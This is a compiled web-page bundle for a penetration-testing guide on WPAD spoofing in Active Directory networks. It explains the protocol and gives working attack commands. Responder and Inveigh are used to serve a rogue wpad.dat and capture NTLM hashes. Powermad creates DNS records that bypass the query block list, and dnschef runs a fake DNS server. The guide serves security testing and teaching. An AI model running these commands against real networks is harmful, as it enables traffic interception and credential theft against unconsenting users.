import{_ as l,c as p,a5 as o,G as s,w as t,B as r,o as d,j as e,a}from"./chunks/framework.B5CpDqM0.js";const v=JSON.parse('{"title":"WPAD spoofing","description":"","frontmatter":{"authors":"ShutdownRepo, sckdev"},"headers":[],"relativePath":"ad/movement/mitm-and-coerced-authentications/wpad-spoofing.md","filePath":"ad/movement/mitm-and-coerced-authentications/wpad-spoofing.md","lastUpdated":1724982529000}'),c={name:"ad/movement/mitm-and-coerced-authentications/wpad-spoofing.md"};function g(u,i,k,f,m,b){const n=r("PluginTabsTab"),h=r("PluginTabs");return d(),p("div",null,[i[2]||(i[2]=o('<h1 id="wpad-spoofing" tabindex="-1">WPAD spoofing <a class="header-anchor" href="#wpad-spoofing" aria-label="Permalink to &quot;WPAD spoofing&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>A proxy can be used to handle clients requests (for example to access the Internet). In a network in which the topology changes frequently, adaptive configurations are needed. A type of proxies called &quot;Adaptive proxies&quot; uses a configuration script.</p><p>The Web Proxy Automatic Discovery (WPAD) protocol helps clients in finding a proxy configuration script (<code>wpad.dat</code>). This script gives a set of proxies that can be used, and can be located with an hostname or an URL. Various mechanisms can be used to find its location (by order of resolution):</p><ol><li>WinHTTP/WinINET</li><li>DHCP</li><li>DNS</li><li>Internet Explorer&#39;s LAN settings, or configuration file</li></ol><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p>WPAD spoofing can be combined with</p><ul><li><a href="./llmnr-nbtns-mdns-spoofing">LLMNR and NBT-NS spoofing</a></li><li><a href="./dhcp-poisoning">DHCP poisoning</a> combined (or not) with DNS spoofing</li><li><a href="./arp-poisoning">ARP poisoning</a> or <a href="./dhcpv6-spoofing">DHCPv6 spoofing</a>, followed by <a href="./dns-spoofing">DNS spoofing</a></li></ul><div class="tip custom-block"><p>Proxy auth NTLM authentication can either be</p><ul><li>forced and <a href="./../ntlm/capture">captured</a> with Responder with <code>--wredir</code> and <code>--ProxyAuth</code></li><li>forced and <a href="./../ntlm/relay">relayed</a> with <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py" target="_blank" rel="noreferrer">ntlmrelayx</a> by using the <code>--http-port 3128</code> argument</li></ul></div><h3 id="through-llmnr-nbt-ns-spoofing" tabindex="-1">through LLMNR, NBT-NS spoofing <a class="header-anchor" href="#through-llmnr-nbt-ns-spoofing" aria-label="Permalink to &quot;through LLMNR, NBT-NS spoofing&quot;">​</a></h3><p>On old Windows systems (i.e. lacking the MS16-077 security update), the WPAD location could be obtained through insecure name resolution protocols like LLMNR and NBT-NS when standard DNS queries were failing (i.e. no DNS record for WPAD). This allowed attackers to operate <a href="./llmnr-nbtns-mdns-spoofing">LLMNR and NBT-NS spoofing</a> to answer those WPAD queries and redirect to a fake <code>wpad.dat</code> file, hence poisoning the web proxy configuration of the requesting clients, hence obtaining more traffic.</p><p><a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noreferrer">Responder</a> (Python) and <a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noreferrer">Inveigh</a> (Powershell) are great tools for name poisoning. In addition to name poisoning, they also have the ability to start servers (listeners) that will <a href="./../ntlm/capture">capture authentications</a> and echo the NTLM hashes to the attacker.</p>',12)),s(h,null,{default:t(()=>[s(n,{label:"UNIX-like"},{default:t(()=>i[0]||(i[0]=[e("p",null,[a("The following command will start "),e("a",{href:"./llmnr-nbtns-mdns-spoofing"},"LLMNR, NBTS and mDNS spoofing"),a(". Name resolution queries for the wpad server will be answered just like any other query. Fake authentication servers (HTTP/S, SMB, SQL, FTP, IMAP, POP3, DNS, LDAP, ...) will "),e("a",{href:"./../ntlm/capture"},"capture NTLM hashes"),a(".")],-1),e("ul",null,[e("li",null,[a("The "),e("code",null,"-w/--wpad"),a(" option will make Responder start the WPAD rogue server so that fake "),e("code",null,"wpad.dat"),a(" file can be served to requesting clients.")]),e("li",null,[a("The "),e("code",null,"-P/--ProxyAuth"),a(" option to force the Windows client to authenticate after the "),e("code",null,"wpad.dat"),a(" is accessed and when the client starts using the proxy")])],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"responder"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --interface"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "eth0"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --wpad"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --ProxyAuth")]),a(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"responder"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -I"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "eth0"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -wP")])])])],-1)])),_:1}),s(n,{label:"Windows"},{default:t(()=>i[1]||(i[1]=[e("p",null,[a("The following command will start "),e("a",{href:"./llmnr-nbtns-mdns-spoofing"},"LLMNR, NBTS and mDNS spoofing"),a(". Name resolution queries for the wpad server will be answered just like any other query. Fake authentication servers (HTTP/S, SMB, SQL, FTP, IMAP, POP3, DNS, LDAP, ...) will "),e("a",{href:"./../ntlm/capture"},"capture NTLM hashes"),a(" (even from machine accounts) and set the Challenge to "),e("code",null,"1122334455667788"),a(" (to "),e("a",{href:"./../credentials/cracking#practice"},"crack NTLM hashes"),a(" with "),e("a",{href:"https://crack.sh/",target:"_blank",rel:"noreferrer"},"crack.sh"),a(").")],-1),e("ul",null,[e("li",null,"Inveigh starts a WPAD rogue proxy server by default."),e("li",null,[a("Options like "),e("code",null,"-WPADAuth"),a(", "),e("code",null,"-WPADAuthIgnore"),a(", "),e("code",null,"-WPADIP"),a(", "),e("code",null,"-WPADPort"),a(", "),e("code",null,"-WPADResponse"),a(" (and others) can be used to tweak the WPAD abuse.")])],-1),e("div",{class:"language- vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"}),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",null,"Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y")])])])],-1)])),_:1})]),_:1}),i[3]||(i[3]=o(`<h3 id="through-adidns-spoofing" tabindex="-1">through ADIDNS spoofing <a class="header-anchor" href="#through-adidns-spoofing" aria-label="Permalink to &quot;through ADIDNS spoofing&quot;">​</a></h3><p>On up-to-date machines (i.e. with the MS16-077 security update applied), WPAD can still be abused through <a href="./adidns-spoofing">ADIDNS spoofing</a> if the WPAD record does not exist. There is however a DNS block list mitigation called GQBL (Global Query Block List) preventing names like WPAD and ISATAP (default entries) to be resolved. This block list exists to reduce vulnerabilities associated with dynamic DNS updates but <a href="https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc995158(v=technet.10)" target="_blank" rel="noreferrer">it can be edited</a> when <a href="https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc995261(v=technet.10)" target="_blank" rel="noreferrer">implementing WPAD</a>.</p><h4 id="pre-cve-2018-8320" tabindex="-1">Pre CVE-2018-8320 <a class="header-anchor" href="#pre-cve-2018-8320" aria-label="Permalink to &quot;Pre CVE-2018-8320&quot;">​</a></h4><p>On machines that are not patched against <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8320" target="_blank" rel="noreferrer">CVE-2018-8320</a>, there are two ways to bypass the GQBL: by <a href="./adidns-spoofing#manuel-record-addition">registering a wildcard record</a> or by registering a domain alias (DNAME) record, which can be conducted as follows with <a href="https://github.com/Kevin-Robertson/Powermad" target="_blank" rel="noreferrer">Powermad</a> (Powershell).</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">New-ADIDNSNode</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -Node</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;*&#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -Data</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;Pentest_IP_Address&#39;</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">New-ADIDNSNode</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -Node</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> wpad</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -Type</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> DNAME</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -Data</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;pentester01.TARGETDOMAIN.LOCAL&#39;</span></span></code></pre></div><h4 id="post-cve-2018-8320" tabindex="-1">Post CVE-2018-8320 <a class="header-anchor" href="#post-cve-2018-8320" aria-label="Permalink to &quot;Post CVE-2018-8320&quot;">​</a></h4><p>On machines that are patched against that CVE, registering a name server (NS) record could still work.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">New-ADIDNSNode</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -Node</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> wpad</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -Type</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> NS</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -Data</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;pentester01.TARGETDOMAIN.LOCAL&#39;</span></span></code></pre></div><p>In order for the NS record technique to work, the tester has to have a DNS server running for <a href="./dns-spoofing">DNS spoofing</a>. This can easily be accomplished with <a href="https://github.com/iphelix/dnschef" target="_blank" rel="noreferrer">dnschef</a> (Python).</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">dnschef</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --fakeip</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;Pentest_IP_Address&#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --interface</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;Pentest_IP_Address&#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --port</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 53</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --logfile</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> dnschef.log</span></span></code></pre></div><h3 id="through-dhcpv6-spoofing" tabindex="-1">through DHCPv6 spoofing <a class="header-anchor" href="#through-dhcpv6-spoofing" aria-label="Permalink to &quot;through DHCPv6 spoofing&quot;">​</a></h3><p>On up-to-date machines (i.e. with the MS16-077 security update applied), WPAD can still be abused through <a href="./adidns-spoofing">ADIDNS spoofing</a>, even if the WPAD record does exist. With DNS poisoning through DHCPv6 spoofing, an attacker can reply to DHCPv6 requests, and then reply to DNS queries.</p><p>This attack can be conducted with <a href="https://github.com/fox-it/mitm6" target="_blank" rel="noreferrer">mitm6</a> (Python), see the <a href="./dhcpv6-spoofing">DHCPv6 spoofing</a> page for exploitation notes.</p><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://blog.netspi.com/adidns-revisited/" target="_blank" rel="noreferrer">https://blog.netspi.com/adidns-revisited/</a></p><p><a href="https://www.fox-it.com/en/news/blog/mitm6-compromising-ipv4-networks-via-ipv6/" target="_blank" rel="noreferrer">https://www.fox-it.com/en/news/blog/mitm6-compromising-ipv4-networks-via-ipv6/</a></p>`,16))])}const F=l(c,[["render",g]]);export{v as __pageData,F as default};
